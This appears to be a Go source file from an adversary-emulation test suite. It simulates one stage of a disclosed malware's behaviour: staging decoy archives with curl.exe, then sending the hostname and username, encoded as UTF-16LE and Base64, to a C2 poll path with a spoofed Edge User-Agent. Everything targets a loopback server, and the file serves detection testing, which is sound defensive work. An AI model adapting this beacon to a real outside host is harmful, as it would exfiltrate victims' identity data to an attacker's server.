//go:build windows
// +build windows

/*
STAGE 7: CosmicPulse Beacon over Web Protocol (T1071.001)
Simulates the final CosmicPulse behaviors from the disclosure:

  Installer staging: the CPL downloader fetches two archives (a Python 3.8
  package and a bootstrapper) that it stages in the victim workspace before
  laying down the backdoor.

  Registration beacon: Task 1 ("Internet Quality Test Connection")
  exfiltrates the host name and user name as a UTF-16 + Base64-encoded
  string to the C2, using spoofed Chrome/Edge User-Agents over HTTP.

Sandbox mapping: the archives are decoys fetched by curl.exe from the
orchestrator's loopback server into ARTIFACT_DIR, and the beacon targets
http://127.0.0.1:<port>/agent/poll with the exact encoding (UTF-16LE of
"hostname|username", then Base64) and a spoofed Edge User-Agent. No traffic
leaves the machine.
*/

package main

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf16"
)

const (
	TEST_UUID      = "c3b4301e-b502-43a4-9f01-66a874239d1b"
	TECHNIQUE_ID   = "T1071.001"
	TECHNIQUE_NAME = "CosmicPulse HTTP Beacon (UTF-16LE + Base64 host data)"
	STAGE_ID       = 7

	INVITE_SUBDIR = "StarBlizzardInvite"
	POLL_PATH     = "/agent/poll"
	// Spoofed Edge/Chrome UA per the disclosure's C2 profile
	SPOOFED_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Python/bootstrapper staging + registration beacon to loopback /agent/poll")

	if err := performTechnique(); err != nil {
		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		exitCode := determineExitCode(err)
		if exitCode == StageBlocked || exitCode == StageQuarantined {
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
		} else {
			LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		}
		os.Exit(exitCode)
	}

	fmt.Printf("[STAGE %s] CosmicPulse beacon cycle completed\n", TECHNIQUE_ID)
	LogMessage("SUCCESS", TECHNIQUE_ID, "installer staging done and registration beacon answered")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "archives staged; UTF-16LE+Base64 beacon delivered to loopback C2")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	port := os.Getenv("F0_LOOPBACK_PORT")
	if port == "" {
		return fmt.Errorf("prerequisite missing: F0_LOOPBACK_PORT not set (orchestrator loopback server required)")
	}
	baseURL := fmt.Sprintf("http://127.0.0.1:%s", port)

	// ------------------------------------------------------------------
	// Installer staging (downloader fetches Python package + bootstrapper)
	// ------------------------------------------------------------------
	stageDir := filepath.Join(ARTIFACT_DIR, INVITE_SUBDIR, "bin", "update")
	if err := os.MkdirAll(stageDir, 0755); err != nil {
		return fmt.Errorf("staging directory creation failed: %v", err)
	}
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("staging installer archives under %s (video-conference app folder pattern)", stageDir))

	for _, asset := range []struct{ urlPath, destName string }{
		{"/assets/python38.zip", "python38.zip"},
		{"/assets/bootstrapper.zip", "bootstrapper.zip"},
	} {
		dest := filepath.Join(stageDir, asset.destName)
		if err := curlFetch(baseURL+asset.urlPath, dest); err != nil {
			return fmt.Errorf("curl fetch of %s ended: %v", asset.destName, err)
		}
		data, err := os.ReadFile(dest)
		if err != nil || len(data) == 0 {
			return fmt.Errorf("staged archive %s is empty or unreadable", asset.destName)
		}
		LogFileDropped(asset.destName, dest, int64(len(data)), false)
	}

	// ------------------------------------------------------------------
	// Registration beacon — exact encoding from the disclosure:
	// host name + user name -> UTF-16LE -> Base64 -> HTTP GET id parameter
	// ------------------------------------------------------------------
	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	beaconData := fmt.Sprintf("%s|%s", hostname, username)

	encoded := base64.StdEncoding.EncodeToString(utf16LE(beaconData))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("registration data: %s -> UTF16LE+Base64: %s", beaconData, encoded))

	beaconURL := fmt.Sprintf("%s%s?id=%s", baseURL, POLL_PATH, encoded)
	var lastErr error
	for attempt := 1; attempt <= 3; attempt++ {
		err := curlBeacon(beaconURL)
		if err == nil {
			LogMessage("INFO", TECHNIQUE_ID,
				fmt.Sprintf("beacon attempt %d answered 200 — C2 registration complete", attempt))
			return nil
		}
		lastErr = err
		LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("beacon attempt %d ended: %v — retrying", attempt, lastErr))
		time.Sleep(2 * time.Second)
	}
	return fmt.Errorf("beacon did not complete after 3 attempts: %v", lastErr)
}

// curlBeacon delivers the registration beacon with the system curl.exe
// (spoofed Edge User-Agent), matching the curl.exe tradecraft used across
// the chain. Verifies the response carried the C2 acknowledgment marker.
func curlBeacon(url string) error {
	curlPath := filepath.Join(os.Getenv("SystemRoot"), "System32", "curl.exe")
	cmd := exec.Command(curlPath, "-s", "-S", "--fail", "-A", SPOOFED_UA, "-o", filepath.Join(LOG_DIR, "beacon_response.txt"), "-w", "%{http_code}", url)
	var httpCode bytes.Buffer
	cmd.Stdout = &httpCode
	errOut := new(bytes.Buffer)
	cmd.Stderr = errOut
	err := cmd.Run()
	LogProcessExecution("curl.exe", fmt.Sprintf("curl.exe -A <spoofed-edge-ua> %s", url), pidOf(cmd), err == nil, exitCodeOf(err), strings.TrimSpace(errOut.String()))
	if err != nil {
		return fmt.Errorf("curl beacon exited %d: %s", exitCodeOf(err), strings.TrimSpace(errOut.String()))
	}
	if strings.TrimSpace(httpCode.String()) != "200" {
		return fmt.Errorf("beacon returned HTTP %s", strings.TrimSpace(httpCode.String()))
	}
	return nil
}

// utf16LE encodes s as little-endian UTF-16 bytes (the report's
// "UTF-16 + Base64" host-data format).
func utf16LE(s string) []byte {
	runes := utf16.Encode([]rune(s))
	buf := make([]byte, 2*len(runes))
	for i, r := range runes {
		binary.LittleEndian.PutUint16(buf[2*i:], r)
	}
	return buf
}

// curlFetch stages an archive with the system curl.exe so the fetch
// generates real process telemetry.
func curlFetch(url, dest string) error {
	cmd := exec.Command(filepath.Join(os.Getenv("SystemRoot"), "System32", "curl.exe"),
		"-s", "-S", "-o", dest, url)
	out, err := cmd.CombinedOutput()
	LogProcessExecution("curl.exe", fmt.Sprintf("curl.exe -s -S -o %s %s", dest, url), pidOf(cmd), err == nil, exitCodeOf(err), strings.TrimSpace(string(out)))
	if err != nil {
		return fmt.Errorf("curl.exe exited %d: %s", exitCodeOf(err), strings.TrimSpace(string(out)))
	}
	if _, statErr := os.Stat(dest); os.IsNotExist(statErr) {
		return fmt.Errorf("staged file not present after fetch: %s", dest)
	}
	return nil
}

func exitCodeOf(err error) int {
	if err == nil {
		return 0
	}
	if exitErr, ok := err.(*exec.ExitError); ok {
		return exitErr.ExitCode()
	}
	return 999
}

func pidOf(cmd *exec.Cmd) int {
	if cmd != nil && cmd.Process != nil {
		return cmd.Process.Pid
	}
	return 0
}

func determineExitCode(err error) int {
	if err == nil {
		return StageSuccess
	}
	errStr := err.Error()
	if containsAny(errStr, []string{"access denied", "access is denied", "permission denied", "operation not permitted"}) {
		return StageBlocked
	}
	if containsAny(errStr, []string{"quarantined", "virus", "threat"}) {
		return StageQuarantined
	}
	if containsAny(errStr, []string{"not found", "not present", "does not exist", "no such", "not running", "not available", "prerequisite missing"}) {
		return StageError
	}
	return StageError
}

func containsAny(s string, substrings []string) bool {
	for _, substr := range substrings {
		if containsCI(s, substr) {
			return true
		}
	}
	return false
}

func containsCI(s, substr string) bool {
	return len(s) >= len(substr) && indexIgnoreCase(s, substr) >= 0
}

func indexIgnoreCase(s, substr string) int {
	s = toLowerStr(s)
	substr = toLowerStr(substr)
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

func toLowerStr(s string) string {
	result := make([]byte, len(s))
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c = c + ('a' - 'A')
		}
		result[i] = c
	}
	return string(result)
}
